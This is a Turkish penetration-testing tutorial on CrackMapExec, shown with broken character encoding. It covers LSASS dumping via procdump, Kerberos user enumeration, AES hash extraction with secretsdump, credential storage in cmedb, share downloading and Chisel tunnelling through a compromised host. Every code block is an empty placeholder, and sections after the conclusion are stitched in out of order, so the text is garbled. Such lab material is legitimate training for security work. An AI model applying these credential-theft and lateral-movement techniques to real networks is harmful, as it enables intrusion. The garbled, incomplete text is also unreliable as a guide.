AyrÄ±ca `context.log.highlight(p)`'den deÄŸeri alabilir ve bir hata varsa farklÄ± bir ÅŸey gÃ¶sterebiliriz. Bu kodu geliÅŸtirmek iÃ§in fikirleriniz nelerdir?

### DiÄŸer Yazarlardan Ã–ÄŸrenmek

ArtÄ±k yeni bir modÃ¼l oluÅŸturmanÄ±n temellerini Ã¶ÄŸrendiÄŸimize gÃ¶re, diÄŸer modÃ¼lleri keÅŸfetmeli ve birkaÃ§ fikir edinmeliyiz.

Ã–rneÄŸin, `procdump.py` modÃ¼lÃ¼ `procdump.exe` Ã§alÄ±ÅŸtÄ±rÄ±labilir dosyasÄ±nÄ± bir `Base64` string olarak kaydeder, ardÄ±ndan Base64 stringini bir dosyaya dÃ¶nÃ¼ÅŸtÃ¼rÃ¼r ve hedef iÅŸletim sisteminde tutar. LSASS'Ä±n iÅŸlem kimliÄŸini almak iÃ§in `tasklist` komutunu Ã§alÄ±ÅŸtÄ±rÄ±r, bunu bir deÄŸiÅŸkene kaydeder ve process kimliÄŸini procdump.exe'nin yÃ¼rÃ¼tÃ¼lmesine bir argÃ¼man olarak geÃ§irir.

BaÅŸka bir Ã¶rnek `get_description.py` . Bu modÃ¼lÃ¼ `groupmembership` modÃ¼lÃ¼nÃ¼ oluÅŸturmak iÃ§in Ã¶rnek olarak aldÄ±k. Bu modÃ¼l, bir sorgu gerÃ§ekleÅŸtirmek ve `memberOf` attribute'unu almak iÃ§in ihtiyaÃ§ duyduÄŸumuz gibi, sonuÃ§larÄ±nÄ± bir LDAP sorgusuna dayalÄ± olarak alÄ±r. Kodda bazÄ± deÄŸiÅŸiklikler yaptÄ±k, yeni bir modÃ¼l oluÅŸturduk ve bir pull request gÃ¶nderdik. Pull request kabul edildikten sonra tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir olacaktÄ±r.

Yeni modÃ¼ller oluÅŸturmak iÃ§in MSSQL gibi diÄŸer protokoller iÃ§in baÅŸka Ã¶rneklere de bakabiliriz.


### Pull Request OluÅŸturma

CrackMapExec gibi bir proje topluluk tarafÄ±ndan canlÄ± tutulur. ModÃ¼lÃ¼mÃ¼zÃ¼n tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir hale geleceÄŸi ve aracÄ±n kendisinin bir parÃ§asÄ± olarak dahil edileceÄŸi bir pull request'i ekleyerek projeye katkÄ±da bulunabiliriz.

Bir pull request'i yapmak iÃ§in [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kÄ±lavuzunu takip edebilir ve CrackMapExec'e katkÄ±da bulunabiliriz.

Ä°lerleyen bÃ¶lÃ¼mlerde, CrackMapExec kullanÄ±mÄ± iÃ§in `IPv6`, `Kerberos Kimlik DoÄŸrulama` ve `CrackMapExec` veritabanÄ±nda uzmanlaÅŸma gibi bazÄ± bonus konularÄ± tartÄ±ÅŸacaÄŸÄ±z.


### Ek CME Ä°ÅŸlevselliÄŸi

CrackMapExec, Ã§eÅŸitli senaryolarda Ã§ok faydalÄ± olacak baÅŸka yardÄ±mcÄ± programlara da sahiptir. Bu bÃ¶lÃ¼mde, bunlardan Ã¼Ã§Ã¼nÃ¼ inceleyeceÄŸiz:

* Audit mode
* IPv6 desteÄŸi
* Birden fazla cihaza saldÄ±rÄ±rken tamamlanma yÃ¼zdesi

### Audit Mode

5.3.0 sÃ¼rÃ¼mÃ¼nde yeni bir mod eklendi: `audit modu`. Bu mod, ÅŸifreyi veya hash'i tercih ettiÄŸimiz bir karakterle veya hatta en sevdiÄŸimiz `emoji` ile deÄŸiÅŸtirir. Bu Ã¶zellik, bir mÃ¼ÅŸteri raporu yazarken ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼n bulanÄ±klaÅŸmasÄ±nÄ± Ã¶nlemeye yardÄ±mcÄ± olur.

Audit modunu yapÄ±landÄ±rmak iÃ§in, varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunan yapÄ±landÄ±rma dosyasÄ±nÄ± dÃ¼zenlememiz ve `audit_mode` parametresini tercih ettiÄŸimiz karakterle deÄŸiÅŸtirmemiz gerekir. Bu karakter, CrackMapExec Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken parolanÄ±n veya hash'in yerini alacaktÄ±r. Bu Ã¶rnek iÃ§in `#` karakterini kullanacaÄŸÄ±z


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Åimdi Ã§alÄ±ÅŸtÄ±rabilir ve parolanÄ±n Ã§Ä±ktÄ±da `########` ile deÄŸiÅŸtirildiÄŸini gÃ¶rebiliriz.

{{CODE_BLOCK_238}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, Ã§alÄ±ÅŸtÄ±rma sonucundaki password `#` karakteri ile deÄŸiÅŸtirilir. Ancak, komut ÅŸifreyi gÃ¶sterir. Bu gibi durumlarda, istenen komutu Ã§alÄ±ÅŸtÄ±rmadan Ã¶nce parolayÄ± bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile EtkinleÅŸtirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diÄŸer yeteneÄŸi, IPv6 Ã¼zerinden iletiÅŸimi desteklemesidir. Ã‡oÄŸu organizasyon, IPv6'yÄ± varsayÄ±lan olarak etkinleÅŸtirmiÅŸtir, hatta bunu kullanmasalar bile, IPv6'nÄ±n log seviyesinde IPv4 kadar izlenmediÄŸi veya anlaÅŸÄ±lmadÄ±ÄŸÄ± durumlar da olabilir. Bu durum, aÄŸ saldÄ±rÄ±larÄ±nÄ±n gerÃ§ekleÅŸtirilmesi ve tespit edilmeden geÃ§mesi iÃ§in bir fÄ±rsat yaratÄ±r.

PopÃ¼ler modÃ¼ller bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, CrackMapExec, `get_netconnections` modÃ¼lÃ¼yle bilgisayarlarÄ±n IPv6 adreslerini belirlememize olanak tanÄ±r. Bu modÃ¼lÃ¼ kullanarak IPv6 Ã¼zerinden komutu Ã§alÄ±ÅŸtÄ±rmayÄ± deneyelim.

### get_netconnections ModÃ¼lÃ¼nÃ¼ Ã‡alÄ±ÅŸtÄ±rma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Åimdi IPv6 Ã¼zerinden hedefe eriÅŸelim.

{{CODE_BLOCK_241}}



### Tamamlanma YÃ¼zdesi

ArtÄ±k bir tarama Ã§alÄ±ÅŸÄ±rken enter tuÅŸuna basabilirsiniz ve CME size tamamlanma yÃ¼zdesini ve taranacak kalan host sayÄ±sÄ±nÄ± verecektir. Bu modÃ¼l laboratuvarÄ±nda her seferinde bir host'a saldÄ±rÄ±yoruz, ancak daha kapsamlÄ± bir aÄŸ bulduÄŸunuzda, bÃ¼yÃ¼k olasÄ±lÄ±kla bu Ã¶zelliÄŸi kullanacaksÄ±nÄ±z. Åimdilik `--shares` seÃ§eneÄŸini Ã§alÄ±ÅŸtÄ±ralÄ±m ve bitmeden Ã¶nce enter tuÅŸuna basalÄ±m.


### Tamamlanma YÃ¼zdesi

{{CODE_BLOCK_242}}

AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, Kerberos kimlik doÄŸrulamasÄ±nÄ± ve CrackMapExec'in bu kimlik doÄŸrulama yÃ¶ntemi iÃ§in iÃ§erdiÄŸi yeni deÄŸiÅŸiklikleri tartÄ±ÅŸacaÄŸÄ±z.

---


### Kerberos Authentication

Yazma sÄ±rasÄ±nda CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri iÃ§in Kerberos Kimlik DoÄŸrulamasÄ±nÄ± desteklemektedir. Kerberos Kimlik DoÄŸrulamasÄ±nÄ± kullanmanÄ±n iki (2) yolu vardÄ±r:

* `ccache` dosyasÄ±nÄ± belirtmek iÃ§in `KRB5CCNAME` env adÄ±nÄ± kullanma. 
* CrackMapExec 5.4.0'dan baÅŸlayarak, artÄ±k Kerberos kimlik doÄŸrulamasÄ± iÃ§in bir Ticketla `KRB5CCNAME` environment variable'Ä±nÄ± kullanmamÄ±z gerekmiyor. Bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanÄ±rken gÃ¶z Ã¶nÃ¼nde bulundurulmasÄ± gereken Ã¶nemli bir unsur, saldÄ±rdÄ±ÄŸÄ±mÄ±z bilgisayarÄ±n domain ve hedef makinenin `FQDN`'sini Ã§Ã¶zÃ¼mlemesi gerektiÄŸidir. Ä°nternal bir aÄŸdaysak, bilgisayarÄ±mÄ±zÄ± ÅŸirketin DNS'sine domain adÄ± Ã§Ã¶zÃ¼mlemeleri yapacak ÅŸekilde yapÄ±landÄ±rabiliriz, ancak durum bÃ¶yle deÄŸildir. DNS'i yapÄ±landÄ±ramayÄ±z ve `/etc/hosts` dosyasÄ±na domain controller ve hedef makinemiz iÃ§in FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doÄŸrulamasÄ± ile kullanmayÄ± deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seÃ§eneÄŸi olmadan bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash ile kullandÄ±ÄŸÄ±mÄ±zda, NTLM kimlik doÄŸrulamasÄ± gerÃ§ekleÅŸtiririz. Kerberos seÃ§eneÄŸini kullanÄ±rsak bunun yerine Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

Yeni Kerberos kimlik doÄŸrulama uygulamasÄ± ile CrackMapExec, CME iÃ§inde kendi `Kerbrute`'unu oluÅŸturmak iÃ§in tÃ¼m bileÅŸenlere sahiptir. Bu, CME'nin bir kullanÄ±cÄ±nÄ±n domain Ã¼zerinde var olup olmadÄ±ÄŸÄ±nÄ± ve bu kullanÄ±cÄ±nÄ±n Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek ÅŸekilde yapÄ±landÄ±rÄ±lÄ±p yapÄ±landÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± anlayabileceÄŸi anlamÄ±na gelir. Bunu aÅŸaÄŸÄ±daki hesaplarla Ã§alÄ±ÅŸÄ±rken gÃ¶relim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

{{CODE_BLOCK_246}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `Kerbrute` CrackMapExec TGT isteklerini Ã¶n kimlik doÄŸrulamasÄ± olmadan gÃ¶nderdiÄŸinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasÄ±yla yanÄ±t verirse, kullanÄ±cÄ± adÄ± mevcut deÄŸildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasÄ±yla yanÄ±t verir, bu da kullanÄ±cÄ± adÄ±nÄ±n mevcut olduÄŸu anlamÄ±na gelir. Son olarak, `asreproast` saldÄ±rÄ±sÄ±na karÅŸÄ± savunmasÄ±z bir hata hesabÄ± gÃ¶rÃ¼rsek, daha Ã¶nce `AESREPRoast` HesaplarÄ±nÄ± Bulma bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi AESREPoast saldÄ±rÄ±larÄ±na karÅŸÄ± hassastÄ±r.

Bu, oturum aÃ§ma hatalarÄ±na neden olmaz, bu nedenle herhangi bir hesabÄ± kilitlemez, ancak Kerberos logu etkinleÅŸtirilmiÅŸse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralÄ± bir Windows olay kimliÄŸi oluÅŸturur.


### AES-128 veya AES-256 kullanma

AyrÄ±ca, Kerberos Kimlik DoÄŸrulamasÄ± iÃ§in AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araÃ§lar, genellikle bu tÃ¼r hash'leri alabilir. AES-128 veya AES-256 kullandÄ±ÄŸÄ±mÄ±zda, trafiÄŸimiz normal Kerberos trafiÄŸine daha Ã§ok benzeyecek ve bu da operasyonel bir avantaj (opsec) saÄŸlayacaktÄ±r. Hadi Secretsdump'u kullanalÄ±m ve ardÄ±ndan AES256 ile kimlik doÄŸrulamasÄ± yapalÄ±m.


### AES256 ile Kimlik DoÄŸrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanÄ±cÄ±nÄ±n oturumu sÃ¼rdÃ¼ÄŸÃ¼ sÃ¼rece geÃ§erli kalÄ±rlar, bu nedenle servislere birden fazla kez kimlik doÄŸrulamasÄ± yapmak (Ã¶rneÄŸin, bir web veya posta sunucusuna birden fazla kez baÄŸlanmak) her seferinde KDC ile iletiÅŸim kurmayÄ± gerektirmez.

Ã‡oÄŸu durumda, Linux makineleri Kerberos tickerlarÄ± ccache dosyalarÄ± olarak depolar, sistemlerin ticketlarÄ± kullanma ÅŸekli, `ccache` dosyasÄ±nÄ±n yolunu gÃ¶steren `KRB5CCNAME` environment variable aracÄ±lÄ±ÄŸÄ±yla olur. robert kullanÄ±cÄ±sÄ± iÃ§in bir ticket (ccache dosyasÄ±) oluÅŸturalÄ±m ve DC01'e kimlik doÄŸrulamasÄ± yapalÄ±m

Ticket'Ä± oluÅŸturmak iÃ§in [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracÄ±nÄ± kullanacaÄŸÄ±z ve KRB5CCNAME environment variable'i getTGT.py tarafÄ±ndan oluÅŸturulan ccache dosyasÄ±nÄ±n yoluna ayarlayacaÄŸÄ±z.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doÄŸrulama yÃ¶ntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak iÃ§in `--use-kcache` seÃ§eneÄŸini kullanmamÄ±z gerekir. KullanÄ±cÄ± adÄ± ve parola seÃ§enekleri gerekli deÄŸildir.


### ccache DosyasÄ±nÄ± Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak Kullanma (SMB ProtokolÃ¼)

{{CODE_BLOCK_251}}


### Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak ccache DosyasÄ±nÄ±n KullanÄ±lmasÄ± (LDAP ProtokolÃ¼)

{{CODE_BLOCK_252}}

Kerberos Kimlik DoÄŸrulamasÄ±nÄ± `MSSQL` protokolÃ¼ ile kullanmak iÃ§in hedef olarak IP adresi yerine bilgisayar adÄ±nÄ± veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolÃ¼nÃ¼n perde arkasÄ±nda IP'yi FQDN'ye dÃ¶nÃ¼ÅŸtÃ¼rmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasÄ±dÄ±r.


### MSSQL ProtokolÃ¼ ile ccache DosyasÄ±nÄ± Kullanma

{{CODE_BLOCK_253}}

KullanÄ±cÄ± adlarÄ± ve parolalarla yaptÄ±ÄŸÄ±mÄ±z gibi Kerberos kimlik doÄŸrulamasÄ± ile herhangi bir modÃ¼lÃ¼ veya seÃ§eneÄŸi Ã§alÄ±ÅŸtÄ±rabiliriz


### Kerberos Kimlik DoÄŸrulamasÄ± ile PaylaÅŸÄ±mlarÄ± Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'Ä±n nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrendik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, CrackMapExec veritabanÄ± `cmedb` ile etkileÅŸime gireceÄŸiz

---


### CMEDB'de UzmanlaÅŸmak

CME otomatik olarak tÃ¼m kullanÄ±lan/dump edilen kimlik bilgilerini (diÄŸer bilgilerle birlikte) ilk Ã§alÄ±ÅŸtÄ±rmada kurulan `SQLite` veritabanÄ±nda saklar. TÃ¼m Ã§alÄ±ÅŸma alanlarÄ± ve ilgili veritabanlarÄ± `~/.cme/workspaces` iÃ§inde saklanÄ±r. VarsayÄ±lan veritabanlarÄ± `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol iÃ§in bir SQLite dosyasÄ± bulunur.


### VarsayÄ±lan VeritabanlarÄ±nÄ± Listeleme

{{CODE_BLOCK_255}}

### VeritabanÄ± ile EtkileÅŸim

CME, back-end veritabanÄ± ile etkileÅŸimi kolaylaÅŸtÄ±ran ikinci bir komut satÄ±rÄ± script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i gÃ¶tÃ¼recektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

VarsayÄ±lan workspace adÄ± `default` olarak adlandÄ±rÄ±lÄ±r (bilgi `prompt` gÃ¶sterildiÄŸi gibi). Bir workspace seÃ§ildiÄŸinde, CME'de yaptÄ±ÄŸÄ±mÄ±z her ÅŸey bu workspace'de saklanacaktÄ±r. Bir workspace oluÅŸturmak iÃ§in, `cmedb (default) >` komut promt root'una gitmemiz gerekir. EÄŸer protokol veritabanÄ±ndaysak, geri komutunu kullanmamÄ±z gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek iÃ§in `workspace list` , workspace'i deÄŸiÅŸtirmek iÃ§in ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve DeÄŸiÅŸtirme

{{CODE_BLOCK_258}}


### Bir ProtokolÃ¼n VeritabanÄ±na EriÅŸim

cmedb her protokol iÃ§in bir veritabanÄ±na sahiptir, ancak bu modÃ¼lÃ¼n yazÄ±ldÄ±ÄŸÄ± sÄ±rada yalnÄ±zca `SMB` ve `MSSQL` yararlÄ± seÃ§eneklere sahiptir:

| Protokol | SeÃ§enekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolÃ¼n veritabanÄ±na eriÅŸmek iÃ§in `proto` `<protocol>` komutunu Ã§alÄ±ÅŸtÄ±rÄ±n. Protokol iÃ§inde, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `help` seÃ§eneÄŸini kullanabiliriz:

### SMB Protokol VeritabanÄ±na BaÄŸlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolÃ¼nÃ¼ her kullandÄ±ÄŸÄ±mÄ±zda, kimlik bilgileri, saldÄ±rdÄ±ÄŸÄ±mÄ±z hostlar, eriÅŸtiÄŸimiz paylaÅŸÄ±mlar ve listelediÄŸimiz gruplar CrackMapExec veritabanÄ±nda saklanÄ±r. VeritabanÄ±nda sahip olduÄŸumuz verilere eriÅŸelim.

### Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

CrackMapExec veritabanÄ±, CrackMapExec kullanarak kullandÄ±ÄŸÄ±mÄ±z veya elde ettiÄŸimiz tÃ¼m kimlik bilgilerini depolar. Bu veritabanÄ±, kimlik bilgilerinin tÃ¼rÃ¼nÃ¼, `dÃ¼z metin` veya `hash` olup olmadÄ±ÄŸÄ±nÄ±, domain, kullanÄ±cÄ± adÄ± ve ÅŸifreyi saklar. SMB protokolÃ¼nÃ¼n kimlik bilgilerini gÃ¶rmek iÃ§in protokol iÃ§indeki `creds` seÃ§eneÄŸini kullanmamÄ±z gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


GÃ¶rdÃ¼ÄŸÃ¼nÃ¼z gibi, creds'ten sonra bir `kullanÄ±cÄ± adÄ±` ekleyerek belirli kullanÄ±cÄ±larÄ± da sorgulayabiliriz. AyrÄ±ca `creds hash` seÃ§eneÄŸi ile tÃ¼m hash'leri veya `creds plaintext` seÃ§eneÄŸi ile tÃ¼m plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve DÃ¼z Metin Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolÃ¼ne kaydedilir ve SMB kimlik bilgilerini gÃ¶rÃ¼ntÃ¼lediÄŸimiz gibi gÃ¶rÃ¼ntÃ¼lenebilir


### MSSQL iÃ§in Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_262}}

Not: Domain alanÄ±nÄ± bir bilgisayar ile gÃ¶rÃ¼yorsak, bu bir MSSQL hesabÄ± kullandÄ±ÄŸÄ±mÄ±z anlamÄ±na gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in veritabanÄ±ndaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediÄŸimiz kimlik bilgilerini tanÄ±mlamamÄ±z ve hangi id'nin hesapla iliÅŸkili olduÄŸunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalÄ±m. KullanÄ±cÄ± adÄ± ve parola yerine bir kimlik bilgisi kullanmak iÃ§in `-id CredID` seÃ§eneÄŸini kullanmamÄ±z gerekir.

### CrackMapExec ile EtkileÅŸim iÃ§in CredID KullanÄ±mÄ±

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB iÃ§in, eriÅŸim saÄŸladÄ±ÄŸÄ±mÄ±z bilgisayarlarÄ±, IP'lerini, domainlerini ve iÅŸletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanÄ± da belirlediÄŸimiz paylaÅŸÄ±mlÄ± klasÃ¶rleri saklÄ±yor ve okuma ve yazma eriÅŸimine sahip kullanÄ±cÄ±larÄ±mÄ±z olup olmadÄ±ÄŸÄ±nÄ± bize sÃ¶ylÃ¼yor. PaylaÅŸÄ±m bilgilerine eriÅŸmek iÃ§in `cmedb` iÃ§erisinde SMB protokolÃ¼ iÃ§erisinde `shares` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.

### PaylaÅŸÄ±mlarÄ± Geri Alma

{{CODE_BLOCK_265}}


### KullanÄ±cÄ± Ekleme ve KaldÄ±rma

CME, kullanÄ±cÄ±larÄ± veritabanÄ±ndan manuel olarak ekleme veya kaldÄ±rma Ã¶zelliÄŸini destekler. ProtokolÃ¼ (SMB veya MSSQL) seÃ§iyoruz ve `creds add` veya `creds remove` kullanÄ±yoruz.


### cmedb'ye KullanÄ±cÄ± Ekleme

{{CODE_BLOCK_266}}

Åimdi eklediÄŸimiz kullanÄ±cÄ±yÄ± kaldÄ±rmayÄ± deneyebiliriz.

### Bir KullanÄ±cÄ±yÄ± cmedb'den KaldÄ±rma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini Ä°mport Etme

cmedb'nin sahip olduÄŸu bir baÅŸka Ã¶zellik de `Empire`'dan kimlik bilgilerini import etme yeteneÄŸidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu Ã¶zelliÄŸi kullanmak istiyorsanÄ±z `Empire`'Ä± yapÄ±landÄ±rdÄ±ÄŸÄ±nÄ±zdan emin olun

### Export cmedb Data

CrackMapExec veritabanÄ±ndan kimlik bilgilerini, hostlarÄ±, local adminleri ve paylaÅŸÄ±mlarÄ± export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyasÄ± olarak dÄ±ÅŸa aktarÄ±lÄ±r. `LibreOffice` veya `Excel` gibi araÃ§larÄ± kullanarak aÃ§abiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, aÄŸ gÃ¼venliÄŸi testlerinde ve sÄ±zma testlerinde kullanÄ±cÄ±larÄ±n iÅŸini kolaylaÅŸtÄ±ran, etkili bir araÃ§tÄ±r. GeniÅŸ protokol desteÄŸi, hÄ±zlÄ± keÅŸif, gÃ¼venlik aÃ§Ä±klarÄ± tespiti ve yÃ¶netimsel haklar elde etme gibi Ã§eÅŸitli Ã¶zellikleriyle gÃ¼venlik profesyonellerinin vazgeÃ§ilmez araÃ§larÄ± arasÄ±nda yer alÄ±r. Bu araÃ§, aÄŸ yapÄ±larÄ±nÄ±n daha gÃ¼venli hale getirilmesi iÃ§in Ã¶nemli bir rol oynar ve her gÃ¼venlik uzmanÄ±nÄ±n repertuarÄ±nda bulunmasÄ± gereken bir araÃ§tÄ±r.


, 'print

Dizine gidebilir ve kullanÄ±cÄ±nÄ±n eriÅŸebileceÄŸi tÃ¼m dosyalarÄ±n bir listesini alabiliriz:


### KullanÄ±cÄ±nÄ±n KullanabileceÄŸi DosyalarÄ± Listeleme

{{CODE_BLOCK_94}}

EÄŸer paylaÅŸÄ±mÄ±n tÃ¼m iÃ§eriÄŸini indirmek istiyorsak `READ_ONLY=false` seÃ§eneÄŸini aÅŸaÄŸÄ±daki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: SabÄ±rlÄ± olmamÄ±z gerekiyor. PaylaÅŸÄ±lan klasÃ¶r ve dosya sayÄ±sÄ±na baÄŸlÄ± olarak iÅŸlem birkaÃ§ dakika sÃ¼rebilir

`spider_plus` modÃ¼lÃ¼ iÃ§in mevcut tÃ¼m seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `--options` seÃ§eneÄŸini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir `proxy` aracÄ±lÄ±ÄŸÄ±yla diÄŸer aÄŸlara ulaÅŸmak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± anlatÄ±lacaktÄ±r.


---


### Proxychains with CME

### Scenario

Ä°nternal bir Pentest Ã¼zerinde Ã§alÄ±ÅŸÄ±yoruz. Bir aÄŸ taramasÄ± gerÃ§ekleÅŸtirdik ve yalnÄ±zca bir host (10.129.204.133) tespit edip ele geÃ§irebildik. Ele geÃ§irilen bu host Ã¼zerinde `ipconfig` Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, iki aÄŸ baÄŸdaÅŸtÄ±rÄ±cÄ±sÄ± olduÄŸunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip baÅŸka bir hostu gÃ¶steriyor. TopladÄ±ÄŸÄ±mÄ±z bilgilere dayanarak aÅŸaÄŸÄ±daki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu aÄŸdaki (172.16.1.0/24) herhangi bir makineye saldÄ±rmak iÃ§in, saldÄ±rÄ± hostumuz ile MS01 arasÄ±nda bir `tÃ¼nel` kurmalÄ±yÄ±z. Bu nedenle, CME tarafÄ±ndan yÃ¼rÃ¼tÃ¼len tÃ¼m komutlar MS01 Ã¼zerinden geÃ§er.


### Set Up the Tunnel

TÃ¼nelimizi kurmak iÃ§in [Chisel](https://github.com/jpillora/chisel) kullanacaÄŸÄ±z. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldÄ±racaÄŸÄ±mÄ±z makinemiz iÃ§in en son Windows binary'sini ve saldÄ±rÄ± hostumuzda kullanmak iÃ§in en yeni Linux binary'sini indirelim ve aÅŸaÄŸÄ±daki adÄ±mlarÄ± gerÃ§ekleÅŸtirelim:

*  Chisel'Ä± SaldÄ±rÄ± Hostumuza indirin ve Ã‡alÄ±ÅŸtÄ±rÄ±n:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u Ä°ndirin ve Hedef Host'a YÃ¼kleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yÃ¼rÃ¼tme seÃ§eneÄŸi `-x`'i kullanarak Chisel sunucumuza baÄŸlanmak iÃ§in `chisel.exe` dosyasÄ±nÄ± Ã§alÄ±ÅŸtÄ±rÄ±n (Bu seÃ§eneÄŸi Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha fazla tartÄ±ÅŸacaÄŸÄ±z)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar Ã§alÄ±ÅŸmaya devam edecektir. Bunu bu bÃ¶lÃ¼mde daha sonra yapacaÄŸÄ±z.

**Attack host** Ã¼zerinde, **Chisel server** Ã§Ä±ktÄ±sÄ±nda **bir client baÄŸlantÄ±sÄ± aldÄ±ÄŸÄ±mÄ±zÄ± ve tÃ¼neli baÅŸlattÄ±ÄŸÄ±mÄ±zÄ±** gÃ¶steren yeni bir satÄ±r gÃ¶rmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediÄŸini kontrol ederek de tÃ¼nelin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± doÄŸrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

